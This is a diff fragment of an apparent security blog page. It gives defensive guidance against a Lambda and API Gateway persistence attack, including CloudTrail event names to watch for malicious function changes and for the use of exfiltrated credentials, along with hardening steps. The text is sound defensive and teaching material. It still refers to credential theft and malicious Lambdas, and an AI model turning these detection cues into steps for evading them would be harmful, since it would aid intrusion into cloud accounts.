+<h3 id="defense-and-detection-hardening-your-environment">Defense and Detection: Hardening Your Environment</h3>
+<p>Once you've simulated the attack, it's time to put on your "Blue Team" hat and strengthen your defenses.</p>
+<h4 id="monitoring-and-detection-red-flags">Monitoring and Detection (Red Flags)</h4>
+<ul>
+<li><strong>AWS CloudTrail:</strong> Your best friend.<ul>
+<li><strong>Resource Creation/Modification:</strong> Look for events like <code>CreateFunction</code>, <code>UpdateFunctionCode</code>, <code>PublishVersion</code> (for Lambdas) or <code>CreateRestApi</code>, <code>CreateResource</code>, <code>PUT_INTEGRATION</code> (for API Gateway). <strong>Abnormalities in these events are red flags.</strong></li>
+<li><strong>Exfiltration:</strong> Monitor <code>PutObject</code> in S3, especially if you don't expect a Lambda to write to a specific bucket.</li>
+<li><strong>Use of Exfiltrated Credentials:</strong> <code>AssumeRole</code> or <code>GetFederationToken</code> events from <strong>unusual IPs</strong> or with <strong>suspicious credentials</strong> (the exfiltrated ones) are critical.</li>
+</ul>
+</li>
+<li><strong>CloudWatch Lambda Logs:</strong> Set up alerts for execution errors or unusual patterns in your function logs. If the malicious Lambda tries to write to S3 unsuccessfully (thanks to strict policies!), your logs will tell you.</li>
+<li><strong>Amazon GuardDuty:</strong> Enable it. It detects malicious activity, including unusual credential usage, communications with suspicious IPs, and exfiltration attempts.</li>
+<li><strong>Lambda Version Monitoring:</strong> <strong>Crucial for this attack.</strong> Don't just limit yourself to <code>$LATEST</code>. Use CloudWatch Lambda metrics to see <strong>invocations by version</strong>. If an old or "inactive" version suddenly shows invocation activity, investigate!</li>
+<li><strong>AWS Security Hub:</strong> Centralizes security findings from all your services, giving you a holistic view.</li>
+</ul>
+<h4 id="prevention-blue-fortress">Prevention (Blue Fortress)</h4>
+<ul>
+<li><strong>Principle of Least Privilege:</strong> The golden rule. Grant your Lambdas only the absolutely necessary permissions. If a Lambda doesn't need to write to S3, don't give it <code>s3:PutObject</code> permissions!</li>
+<li><strong>Code Review and Secure CI/CD:</strong> Implement security scanning (SAST) in your CI/CD pipelines to detect malicious code or vulnerabilities before deployment. Conduct regular code reviews.</li>
+<li><strong>Credential Management:</strong> Rotate credentials frequently and <strong>never hardcode credentials in your code</strong>. Leverage IAM roles and temporary credentials that Lambda already provides.</li>
+<li><strong>API Gateway Configuration:</strong><ul>
+<li>Restric access with <strong>Authorizers</strong> (Lambda Authorizers, Cognito, IAM).</li>
+<li>Use <strong>AWS WAF</strong> to protect your API Gateway from common attacks.</li>
+</ul>
+</li>
+<li><strong>Network Security (VPC):</strong> If feasible, place your Lambdas inside a VPC to control network traffic more granularly with Security Groups and NACLs.</li>
+<li><strong>AWS Organizations SCPs:</strong> If you use AWS Organizations, Service Control Policies (SCPs) can prevent dangerous actions at the account level, acting as an additional barrier.</li>
+<li><strong>Offensive Mindset:</strong> Finally, and perhaps most importantly, cultivate an <strong>offensive mindset</strong> within your team. Understanding how attackers think and operate will enable you to build more robust and proactive defenses.</li>
+</ul>
+<hr />
+<p>Simulating these sophisticated persistence techniques isn't just a technical exercise; it's an invaluable investment in your ability to protect your AWS environments. By understanding the "how" of the attack, you'll be much better equipped to build the "how" of your defense.</p>
 
 
 
@@ -807,7 +890,7 @@
       <nav class="md-footer__inner md-grid" aria-label="Footer" >
         
           
-          <a href="../defending-s3---anatomy-and-countermeasures-for-encryption-and-deletion-attacks-codefinger-ransomware/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Defending S3 - Anatomy and Countermeasures for Encryption and Deletion Attacks (Codefinger ransomware)">
+          <a href="../../25/iam-access-analyzer---a-cloud-guardian-for-your-s3-buckets/" class="md-footer__link md-footer__link--prev" aria-label="Previous: IAM Access Analyzer - A Cloud Guardian for Your S3 Buckets">
             <div class="md-footer__button md-icon">
               
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
@@ -817,27 +900,11 @@
                 Previous
               </span>
               <div class="md-ellipsis">
-                Defending S3 - Anatomy and Countermeasures for Encryption and Deletion Attacks (Codefinger ransomware)
+                IAM Access Analyzer - A Cloud Guardian for Your S3 Buckets
               </div>
             </div>
           </a>
         
-        
-          
-          <a href="../../27/stealthy-persistence-in-aws---a-practical-simulation-for-defenders/" class="md-footer__link md-footer__link--next" aria-label="Next: Stealthy Persistence in AWS - A Practical Simulation for Defenders">
-            <div class="md-footer__title">
-              <span class="md-footer__direction">
-                Next
-              </span>
-              <div class="md-ellipsis">
-                Stealthy Persistence in AWS - A Practical Simulation for Defenders
-              </div>
-            </div>
-            <div class="md-footer__button md-icon">
-              
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
-            </div>
-          </a>
         
       </nav>
     
